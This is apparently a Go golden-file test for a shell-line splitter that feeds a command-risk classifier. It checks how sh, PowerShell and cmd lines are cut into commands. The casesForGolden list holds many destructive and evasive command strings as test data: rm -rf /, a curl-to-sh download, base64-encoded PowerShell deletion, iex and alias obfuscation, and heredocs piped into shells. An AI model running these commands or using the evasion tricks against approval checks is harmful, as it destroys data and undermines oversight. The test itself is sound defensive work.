package shellsplit_test

import (
	"bufio"
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"

	. "github.com/ipsupport-llc/ipsupport-code/internal/shellsplit"
)

// The Python trainer cuts lines with scripts/shellsplit.py, a port of this
// package; it must cut them exactly as this does, or the model is trained and
// measured on text the scorer never produces. testdata/golden.jsonl is what
// this package returns for every shell line the trainer reads (the dataset and
// the honest set) plus the cases tested here — every one that isn't trivial: a
// line that is one command, cut into itself, is left out, and the trainer
// holds Python to that for any line not listed. This test holds Go to the
// file, and scripts/shellsplit.py checks Python against it on every training
// run.
//
//	go test ./internal/shellsplit -run TestGolden -update   # after editing either side, or the data

var (
	update = flag.Bool("update", false, "rewrite testdata/golden.jsonl from the corpus")
	// Data of your own — a private honest set, a workspace's feedback — cut
	// into a file of its own, outside the repository: what is private stays so.
	extra = flag.String("extra", "", "comma-separated JSONL files to cut into -out instead")
	out   = flag.String("out", "", "where -extra's lines go")
)

type golden struct {
	Dialect Dialect  `json:"dialect"`
	Line    string   `json:"line"`
	Parts   []string `json:"parts"`
	Groups  []string `json:"groups"`
	Code    string   `json:"code"`
	// Incomplete is left out when false, as it nearly always is.
	Incomplete bool `json:"incomplete,omitempty"`
}

type key struct {
	d    Dialect
	line string
}

const goldenPath = "testdata/golden.jsonl"

// DialectFor is the dialect a dataset row is cut by: its "shell" when it
// names one, else its "os" (PowerShell on Windows, sh elsewhere). Mirrors
// dialect() in scripts/train_risk.py.
func DialectFor(shell, os string) Dialect {
	switch shell {
	case "sh":
		return Sh
	case "powershell":
		return PowerShell
	case "cmd":
		return Cmd
	}
	if os == "windows" {
		return PowerShell
	}
	return Sh
}

func corpus(t *testing.T, files ...string) map[key]bool {
	t.Helper()
	lines := map[key]bool{}
	for _, f := range files {
		fh, err := os.Open(f)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(fh)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			var r struct {
				Tool   string         `json:"tool"`
				Action string         `json:"action"`
				Params map[string]any `json:"params"`
				OS     string         `json:"os"`
				Shell  string         `json:"shell"`
				Source string         `json:"source"`
			}
			if json.Unmarshal(sc.Bytes(), &r) != nil || r.Tool != "run" || r.Action != "shell" || r.Source == "approval" {
				continue
			}
			if c, ok := r.Params["command"].(string); ok {
				lines[key{DialectFor(r.Shell, r.OS), c}] = true // cut as written; parts are localized after
			}
		}
		if err := sc.Err(); err != nil {
			t.Fatalf("%s: %v", f, err)
		}
		fh.Close()
	}
	if len(files) != len(shipped) || files[0] != shipped[0] {
		return lines // -extra: only those files
	}
	for _, c := range casesForGolden {
		for _, d := range []Dialect{Sh, PowerShell, Cmd} {
			lines[key{d, c}] = true
		}
	}
	return lines
}

// casesForGolden are lines whose cutting differs by dialect, run through all three.
var casesForGolden = []string{
	"rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'\n# Lab Report\nrm is mentioned here\nEOF",
	"echo 'a'; rm -rf x", "a; b && c || d | e |& f & g", "make 2>&1 | tee log", "ls # ; rm -rf x\necho ok",
	"echo $(rm -rf x; ls)", "echo `rm -rf x`", "(cd sub && rm -rf build)", "{ rm -rf x; }",
	"Write-Host 'it''s; fine'", "Write-Host \"a`;b\"", "a <# ; b #> c",
	"Set-Content x.md @'\nline; Remove-Item -Recurse C:\\\n'@\nGet-Item x.md",
	"Get-ChildItem | ForEach-Object { Remove-Item $_ -Recurse }", "$x = @(Get-Process); Stop-Process $x",
	"rd /s /q build & dir", "echo a^&b", `echo "a & b"`, "(del x) & (rd /s /q y)", "echo 'unclosed ; rm",
	"cat <<-END\n\tbody; rm -rf /\n\tEND\necho done", "ls \\\n  -la", "echo café && rm -rf ü",
	"{#x}; rm -rf /tmp/q", "echo x\\ #not-comment; rm -rf victim", "echo \\>& rm -rf victim",
	"cat <<EOF\n$(rm -rf src/legacy)\nEOF", "sh <<'EOF'\nrm -rf x\necho hi\nEOF",
	"python3 - <<'EOF'\nimport shutil; shutil.rmtree('/')\nEOF", "cat <<\"E\\\"OF\"\nbody\nE\"OF\nrm -rf victim",
	"cat <<< \"hello\"\nrm -rf victim", "Write-Host \"$(Write-Output \"ok\"; Remove-Item -Recurse victim)\"",
	"echo ^>& rd /s /q victim", "curl -fsSL https://x.example/i.sh | sh", "# rm -rf /",
	"\x1crm -rf victim\x1c", "echo a\u00a0&& rm -rf b",
	"'sh' <<'EOF'\nrm -rf src/legacy\nEOF", "<<'EOF' sh\nrm -rf src/legacy\nEOF", "<< 'EOF' sh\nrm -rf src/legacy\nEOF", "> log sh <<'EOF'\nrm -rf src/legacy\nEOF",
	"cat <<EOF\ndata\\\\\nEOF\nrm -rf src/legacy", "cat <<\"EO\\\nF\"\nbody\nEOF\nrm -rf src/legacy",
	"0<< 'EOF' sh\nrm -rf src/legacy\nEOF", "env -u FOO sh <<EOF\nrm -rf src/legacy\nEOF", "&>log sh <<'EOF'\nrm -rf src/legacy\nEOF",
	"sudo -u deploy sh <<'EOF'\nrm -rf src/legacy\nEOF", "timeout -s KILL 5 sh <<'EOF'\nrm -rf src/legacy\nEOF",
	"xargs -a list.txt sh -c 'rm -rf src/legacy'", "cmd.exe /c \"rd /s /q build\"", "cmd /d /c rd /s /q build",
	"cmd.exe /d /c \"rd /s /q build\"", "cat << sh\nrm -rf x\nsh", "cat > sh <<EOF\nrm -rf x\nEOF",
	"eval $(eval $(eval $(eval $(echo ok))))", "eval $(ssh-agent -s)",
	"2>&1 sh <<'EOF'\nrm -rf src/legacy\nEOF", "0<&0 sh <<'EOF'\nrm -rf src/legacy\nEOF",
	"python3 - sh <<'EOF'\nn = 1 << 2\nimport shutil\nshutil.rmtree('x')\nEOF", "cat <<'EOF' | sh\nrm -rf src/legacy\nEOF",
	"cat <<'EOF' | tee log | sudo bash\nrm -rf src/legacy\nEOF", "sh<<'EOF'\nrm -rf src/legacy\nEOF",
	"/bin/bash>log <<EOF\nrm -rf src/legacy\nEOF", "python3<<'EOF'\nimport shutil; shutil.rmtree('x')\nEOF",
	"powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXABzAHIAYwBcAGEAcABwAA==", "powershell /e UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXABzAHIAYwBcAGEAcABwAA==",
	"powershell -enc not-base64!", "cat <<EOF |\nrm -rf x\nEOF\nsh", "cat <<EOF | grep x\nbody\nEOF",
	"echo sh sh sh -c 'rm -rf x'",
	"cat > notes.md <<'EOF'\nrm is mentioned here\nEOF", "git commit -F - <<'EOF'\nmsg\nEOF",
	"git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"", ": <<'EOF'\na comment\nEOF", "2>/dev/null cat >f <<EOF\nbody\nEOF",
	"LC_ALL=C sort <<EOF\nb\na\nEOF", "psql mydb <<'EOF'\nDROP TABLE users;\nEOF", "$SH <<'EOF'\nrm -rf x\nEOF",
	"cat <<'EOF' | xargs rm -rf\nsrc\nEOF", "cat <<'EOF' > >(sh)\nrm -rf x\nEOF", "tee >(sh) <<'EOF'\nrm -rf x\nEOF",
	"sudo -s <<'EOF'\nrm -rf x\nEOF", "sed -f - x.txt <<'EOF'\ns/a/b/\nEOF", "while read l; do :; done <<'EOF'\nx\nEOF",
	"python3.11 <<'EOF'\nimport shutil; shutil.rmtree('x')\nEOF", "ksh93 <<'EOF'\nrm -rf x\nEOF",
	"/usr/bin/perl5.38 - <<'EOF'\nunlink 'x';\nEOF", "\"powershell\" /e UgBlAG0AbwB2AGUA",
	"awk '{ system($0) }' <<'EOF'\nrm -rf x\nEOF", "sed 's/.*/&/e' <<'EOF'\nrm -rf x\nEOF", "patch -p1 <<'EOF'\n--- /dev/null\n+++ b/x\nEOF",
	"git apply <<'EOF'\n--- a/x\n+++ b/x\nEOF", "(\ncat <<'EOF'\nrm -rf x\nEOF\n) | sh", "(cat <<'EOF') | sh\nrm -rf src/legacy\nEOF",
	"{ cat <<'EOF'; } | sh\nrm -rf src/legacy\nEOF", "(cat <<'EOF'; echo hi) | sh\nrm -rf src/legacy\nEOF",
	"case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF", "( (cat <<'EOF') ) |& bash\nrm -rf src/legacy\nEOF",
	"(cat <<'EOF') > out.txt\nrm -rf x\nEOF", "{ cat <<'EOF'; } | grep x\nrm -rf x\nEOF", "(cat <<'EOF') 2>/dev/null | sh\nrm -rf src/legacy\nEOF",
	"((cat <<'EOF') | sh) | grep x\nrm -rf src/legacy\nEOF", "( (cat <<'EOF') | sh; echo hi) | grep x\nrm -rf src/legacy\nEOF",
	"{ { cat <<'EOF'; } | sh; } | grep x\nrm -rf src/legacy\nEOF", "case a in a) case b in b) cat <<'EOF';; esac | sh;; esac | grep x\nrm -rf src/legacy\nEOF",
	"case x in x) (cat <<'EOF') | sh;; esac | grep x\nrm -rf src/legacy\nEOF", "(case x in x) cat <<'EOF';; esac) | sh\nrm -rf src/legacy\nEOF",
	"{ case x in x) cat <<'EOF';; esac; } | sh\nrm -rf src/legacy\nEOF", "git apply<<'EOF'\n--- a/x\n+++ b/x\nEOF",
	"git update-ref --stdin <<'EOF'\nupdate refs/heads/main 0000\nEOF", "case x in (a) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF",
	"! case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF", "time -p case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF",
	"if true\nthen\ncat <<'EOF'\nrm -rf x\nEOF\nfi | sh", "for i in 1\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
	"while true; do\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh", "until false\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
	"time if true\nthen\ncat <<'EOF'\nrm -rf x\nEOF\nfi | sh", "for ((i=0;i<1;i++))\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
	"if true; then echo a; fi; cat <<'EOF' | sh\nrm -rf src/legacy\nEOF",
	"cat <<'EOF' | { :; sh; }\nrm -rf src/legacy\nEOF", "cat <<'EOF' | (true; sh)\nrm -rf src/legacy\nEOF",
	"cat <<'EOF' > >(:; sh)\nrm -rf src/legacy\nEOF", "(cat <<'EOF') > >(sh)\nrm -rf src/legacy\nEOF",
	"{ cat <<'EOF'; } >> >(sh)\nrm -rf src/legacy\nEOF", "case x in x) cat <<'EOF';; esac &> >(sh)\nrm -rf src/legacy\nEOF",
	"select x in a; do cat <<'EOF'; done | sh\nrm -rf src/legacy\nEOF", "if true; then cat <<'EOF'; fi |& sh\nrm -rf src/legacy\nEOF",
	"cat <<'EOF' | { :;\nrm -rf x\nEOF\nsh; }", "exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF", "cat <<'EOF' > >(grep x)\nrm -rf x\nEOF",
	strings.Repeat("(", 400) + "cat <<'EOF'" + strings.Repeat(") | sh", 400) + "\nx\nEOF", // past maxLinks
	"cat 2>&- sh <<EOF\nrm -rf x\nEOF", "FOO=bar exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF", "command -p exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
	"coproc sh; cat <<'EOF' >&${COPROC[1]}\nrm -rf x\nEOF", "f () { cat <<'EOF'; }\nrm -rf x\nEOF\nf | sh",
	"function f { cat <<'EOF'; }\nrm -rf x\nEOF\nf | sh", "sh <(cat <<'EOF')\nrm -rf x\nEOF",
	"echo $((1+2)); cat > f <<'EOF'\nx\nEOF", "arr=(); arr+=(x); cat > f <<'EOF'\nx\nEOF", "exec >log; cat > f <<'EOF'\nx\nEOF",
	"\"exec\" > >(sh); cat <<'EOF'\nrm -rf x\nEOF", "\\exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF", "command \"exec\" > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
	"eval 'coproc sh'; cat <<'EOF' >&${COPROC[1]}\nrm -rf x\nEOF", "read -r -d '' x <<'EOF'; eval \"$x\"\nrm -rf x\nEOF",
	"alias cat=sh; cat <<'EOF'\nrm -rf x\nEOF", "eval $(ssh-agent -s); cat > f <<'EOF'\nx\nEOF", "sh -c 'coproc sh'; cat > f <<'EOF'\nx\nEOF",
	"command alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF", "\"alias\" cat=sh\ncat <<'EOF'\nrm -rf x\nEOF", ">log alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF", "> log alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF",
	">log exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF", "exec> >(sh); cat <<'EOF'\nrm -rf x\nEOF",
	"read -r -d '' x <<'EOF'; e=eval; $e \"$x\"\nrm -rf x\nEOF", "\"$PYTHON\" app.py; cat > f <<'EOF'\nx\nEOF",
	strings.Repeat("eval $(", 12) + "echo ok" + strings.Repeat(")", 12), // past the parse budget
	"sh <<EOF\n# $(rm -rf src/legacy)\nEOF",
	"timeout 5 sh <<EOF\nrm -rf x\nEOF", "ssh deploy@host <<'EOF'\nrm -rf /srv/app\nEOF",
	"echo $(printf x)#not-comment; rm -rf src/legacy", "cat <<EO\\\nF\nbody\nEOF\nrm -rf victim",
	"cat <<EOF\nbody\nEO\\\nF\nrm -rf victim", "sh -c 'echo hi; rm -rf /tmp/q'", "bash -lc \"cd x && rm -rf build\"",
	"pwsh -Command \"Remove-Item -Recurse x\"", "cmd /c \"rd /s /q build\"", "cmd /c rd /s /q build & dir",
	"python3 -c 'import shutil; shutil.rmtree(\"/\")'", "eval 'rm -rf x'", "nice -n 10 bash <<EOF\nmake\nEOF",
	"echo " + strings.Repeat("$(", 40) + "rm -rf x" + strings.Repeat(")", 40),
	"git -C repo commit -F - <<'EOF'\nmsg\nEOF", "git --no-pager log --stdin <<'EOF'\nHEAD\nEOF", "git log --oneline am>out <<'EOF'\nHEAD\nEOF",
	"gh api repos/o/r/issues --input - <<'EOF'\n{}\nEOF", "gh pr create --body-file - <<'EOF'\nbody\nEOF",
	"cat > f <<'EOF'\nx\nEOF\nsh -c 'make all'", "cat > f <<'EOF'\nx\nEOF\nmake $TARGET",
	"Set-Content notes.md @'\nRemove-Item is mentioned\n'@", "@'\nRemove-Item is mentioned\n'@ | Out-File notes.md",
	"$t = @'\nRemove-Item is mentioned\n'@\nSet-Content notes.md $t", "$t=@'\nRemove-Item is mentioned\n'@; whoami",
	"git commit -F - @'\nmsg\n'@", "git -c alias.run='!sh' run <<'EOF'\nrm -rf x\nEOF", "git -calias.run=!sh run <<'EOF'\nrm -rf x\nEOF",
	"git --config-env=alias.run=X run <<'EOF'\nrm -rf x\nEOF", "git -c core.editor=x commit -F - <<'EOF'\nrm -rf x\nEOF",
	"git myalias <<'EOF'\nrm -rf x\nEOF", "gh myext <<'EOF'\nrm -rf x\nEOF", "git apply <<'EOF'\n--- a/x\n+++ b/x\nEOF",
	"read -r x <<'EOF'\nrm -rf x\nEOF\ne=eval; $e \"$x\"", "read -r x <<'EOF'\nrm -rf x\nEOF\nsh -c \"$x\"",
	"read -r x <<'EOF'\nrm -rf x\nEOF\npython3 -c \"$x\"", "read -r x <<'EOF'\nrm -rf x\nEOF\nsh -c '$1' _ \"$x\"",
	"x=$(cat <<'EOF'\nrm -rf x\nEOF\n)\n$x", "read -r x <<'EOF'\nrm -rf x\nEOF\nf () { :; }",
	"pwsh -NoProfile -File - <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF",
	"pwsh -Command - <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF", "powershell.exe <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF",
	"cmd <<'EOF'\nrd /s /q C:\\src\nEOF", "iex @'\nRemove-Item -Recurse -Force ./src\n'@",
	"Invoke-Expression @\"\nRemove-Item -Recurse -Force ./src\n\"@", "@'\nRemove-Item -Recurse -Force ./src\n'@ | iex",
	"@'\nRemove-Item -Recurse -Force ./src\n'@ | Out-String | iex",
	"$c = @'\nRemove-Item -Recurse -Force ./src\n'@\n& ([scriptblock]::Create($c))", "$c=@'\nRemove-Item -Recurse -Force ./src\n'@; iex $c",
	"$c = @'\nRemove-Item -Recurse -Force ./src\n'@; $ExecutionContext.InvokeCommand.InvokeScript($c)",
	"Set-Content x (iex @'\nRemove-Item -Recurse -Force ./src\n'@)", "git -c alias.x='!sh' x @'\nrm -rf src\n'@",
	"read -r x <<'EOF'\nrm -rf x\nEOF\ny=$(e=eval; $e \"$x\")", "git -ccore.editor=sh commit -e -F - <<'EOF'\nrm -rf x\nEOF", "git commit --edit -F - <<'EOF'\nrm -rf x\nEOF", "GIT_EDITOR=sh git commit -e -F - <<'EOF'\nrm -rf x\nEOF",
	"GIT_CONFIG_PARAMETERS=\"'alias.log=!sh'\" git log <<'EOF'\nrm -rf x\nEOF", "gh pr create --editor <<'EOF'\nrm -rf x\nEOF", "LC_ALL=C git commit -F - <<'EOF'\nmsg\nEOF",
	"read -r x <<'EOF'\nrm -rf x\nEOF\ne=eval; echo \"$($e \"$x\")\"", "git -ccore.hooksPath=h commit -F - <<'EOF'\nrm -rf x\nEOF",
	"sort --compress-program=sh -S 1K <<'EOF'\nrm -rf x\nEOF", "sort --compress=sh <<'EOF'\nrm -rf x\nEOF", "rg --pre=sh x <<'EOF'\nrm -rf x\nEOF", "sort -u <<'EOF'\nb\na\nEOF",
	"git grep -e foo <<'EOF'\nx\nEOF", "rg --pretty foo <<'EOF'\nx\nEOF",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nsh -c 'echo hi' _ \"$x\"", "git commit -m \"- fixed\" -F - <<'EOF'\nmsg\nEOF",
	"git commit -ae <<'EOF'\nrm -rf x\nEOF", "git commit -eF - <<'EOF'\nrm -rf x\nEOF",
	"git commit --edi -F - <<'EOF'\nrm -rf x\nEOF", "git commit -t /dev/stdin <<'EOF'\nrm -rf x\nEOF",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nenv $x", "read -r x <<'EOF'\nrm -rf x\nEOF\nsudo $x",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nthen $x", "read -r x <<'EOF'\nrm -rf x\nEOF\npython3 -c\"$x\"",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nnode --eval=\"$x\"", "read -r x <<'EOF'\nrm -rf x\nEOF\nperl -le \"$x\"",
	"exec >\"$LOG\" 2>&1\ncat > f <<'EOF'\nx\nEOF", "git commit --templ=/dev/stdin <<'EOF'\nrm -rf x\nEOF",
	"exec > \"$LOG\" 2>&1\ncat > f <<'EOF'\nx\nEOF", "perl -ne 'print if /x/' f", "python3 -Wignore app.py | cat",
	"$c = @'\nRemove-Item -Recurse -Force ./src\n'@\n$c | iex",
	"$c = @'\nRemove-Item -Recurse -Force ./src\n'@\niex (Get-Variable c -ValueOnly)",
	"Set-Alias sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"Set-Item alias:sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"read -r x <<'EOF'\nrm -rf x\nEOF\n/usr/bin/sudo $x", "read -r x <<'EOF'\nrm -rf x\nEOF\nphp -r \"$x\"",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nnode -p \"$x\"", "read -r x <<'EOF'\nrm -rf x\nEOF\npython3 -Ic\"$x\"",
	"sort --co=sh <<'EOF'\nrm -rf x\nEOF", "perl -c app.py | cat", "node -c app.py | cat", "sh -c'echo hi' | cat",
	"& Set-Alias sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"Se`t-Alias sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@", "& 'Set-Alias' sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"&Set-Alias sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@", "iex \"Set-Alias sc iex\"\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nsudo $x>log", "read -r x <<'EOF'\nrm -rf x\nEOF\npwsh -Com \"$x\"",
	"read -r x <<'EOF'\nrm -rf x\nEOF\npowershell /Command \"$x\"", "gh secret set FOO -e prod <<'EOF'\nvalue\nEOF",
	"& ('Set'+'-Alias') sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"& ('Set' + '-Alias') sc iex\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"$a = 'Set-' + 'Alias'; & $a sc ri\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"$s = 'Set-' + 'Alias sc ri'; iex $s\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"$s = 'Set-' + 'Alias sc ri'; [ScriptBlock]::Create($s).Invoke()\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"$a = 'Set-' + 'Alias'; &$a sc ri\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
	"read -r x <<'EOF'\nrm -rf x\nEOF\nphp --process-code \"$x\"", "read -r x <<'EOF'\nrm -rf x\nEOF\n/usr/bin/time $x",
	"read -r x <<'EOF'\nrm -rf x\nEOF\necho \"$x\" | sh", "read -r x <<'EOF'\nrm -rf x\nEOF\nsh -s <<< \"$x\"",
	"read -r x <<'EOF'\nrm -rf x\nEOF\necho \"$x\" | grep rm", "git notes add -c HEAD -F - <<'EOF'\nrm -rf x\nEOF",
	"Set-`\nAlias sc ri\nsc @'\nRemove-Item -Recurse -Force ./src\n'@",
}

var shipped = []string{"../../scripts/risk_dataset.jsonl", "../../scripts/risk_eval.jsonl"}

func TestGolden(t *testing.T) {
	if *extra != "" {
		if *out == "" {
			t.Fatal("-extra needs -out")
		}
		write(t, corpus(t, strings.Split(*extra, ",")...), *out)
		return
	}
	if *update {
		write(t, corpus(t, shipped...), goldenPath)
	}
	check(t)
}

func write(t *testing.T, lines map[key]bool, to string) {
	t.Helper()
	{
		var out []golden
		for k := range lines {
			if trivial(k) {
				continue
			}
			p := Parse(k.d, k.line)
			g := golden{Dialect: k.d, Line: k.line, Parts: p.Commands, Groups: p.Groups, Code: p.Code, Incomplete: p.Incomplete}
			if g.Parts == nil {
				g.Parts = []string{}
			}
			if g.Groups == nil {
				g.Groups = []string{}
			}
			out = append(out, g)
		}
		sort.Slice(out, func(i, j int) bool {
			if out[i].Dialect != out[j].Dialect {
				return out[i].Dialect < out[j].Dialect
			}
			return out[i].Line < out[j].Line
		})
		var b strings.Builder
		for _, g := range out {
			j, _ := json.Marshal(g)
			b.Write(j)
			b.WriteByte('\n')
		}
		os.MkdirAll(filepath.Dir(to), 0o755)
		if err := os.WriteFile(to, []byte(b.String()), 0o644); err != nil {
			t.Fatal(err)
		}
		t.Logf("wrote %d lines to %s", len(out), to)
	}
}

func check(t *testing.T) {
	t.Helper()
	data, err := os.ReadFile(goldenPath)
	if err != nil {
		t.Fatal(err)
	}
	have := map[key]bool{}
	for _, l := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		var g golden
		if err := json.Unmarshal([]byte(l), &g); err != nil {
			t.Fatal(err)
		}
		if got := Split(g.Dialect, g.Line); !reflect.DeepEqual(got, g.Parts) && !(len(got) == 0 && len(g.Parts) == 0) {
			t.Errorf("Split(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Parts)
		}
		if got := Code(g.Dialect, g.Line); got != g.Code {
			t.Errorf("Code(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Code)
		}
		if got := Parse(g.Dialect, g.Line).Groups; !reflect.DeepEqual(got, g.Groups) && !(len(got) == 0 && len(g.Groups) == 0) {
			t.Errorf("Groups(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Groups)
		}
		if got := Parse(g.Dialect, g.Line).Incomplete; got != g.Incomplete {
			t.Errorf("Incomplete(%d, %q) = %v, golden %v", g.Dialect, g.Line, got, g.Incomplete)
		}
		have[key{g.Dialect, g.Line}] = true
	}
	missing := 0
	for k := range corpus(t, shipped...) {
		if !have[k] && !trivial(k) {
			missing++
		}
	}
	if missing > 0 {
		t.Errorf("%d corpus line(s) not in %s — the data changed: rerun with -update", missing, goldenPath)
	}
}

// trivial is a line that is one command, cut into itself.
func trivial(k key) bool {
	s := Trim(k.line)
	p := Parse(k.d, k.line)
	return len(p.Commands) == 1 && p.Commands[0] == s && len(p.Groups) == 0 && p.Code == s && !p.Incomplete
}
